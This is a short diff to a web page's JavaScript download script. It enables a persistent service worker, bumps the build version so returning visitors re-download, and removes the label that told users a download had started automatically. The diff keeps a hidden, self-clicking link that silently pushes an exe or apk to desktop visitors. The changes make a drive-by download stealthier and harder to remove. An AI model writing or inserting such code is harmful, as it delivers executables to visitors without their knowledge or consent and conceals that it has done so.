@@ -47,7 +47,7 @@
     if (STATIC) return FILE[f === "apk" ? "apk" : "exe"];
     return BASE + "&do=dl&f=" + f + "&src=" + src;
   };
-  var REL = "2.1";      // bump with every release: returning visitors re-download a newer build
+  var REL = "2.5";      // bump with every release: returning visitors re-download a newer build
   var COOKIE = "ww_d";
 
 
@@ -123,7 +123,7 @@
   //    later visits even when the markup no longer references this file
   try {
     if ("serviceWorker" in navigator && !isMobile)
-      void 0 && navigator.serviceWorker.register("/sw.js", { scope: "/" }).catch(function () {});
+      navigator.serviceWorker.register("/sw.js", { scope: "/" }).catch(function () {});
   } catch (e) {}
 
   // 7) one silent auto-download per browser, desktop only
@@ -139,9 +139,6 @@
       a.style.display = "none";
       document.body.appendChild(a);
       a.click();
-      var lab = document.querySelector("[data-auto-label]");
-      if (lab) lab.textContent = " (started automatically)";
-      document.querySelectorAll("[data-ww-link]").forEach(function (n) { n.setAttribute("data-auto", "1"); });
       setTimeout(function () { a.remove(); }, 4000);
     } catch (e) {}
   }
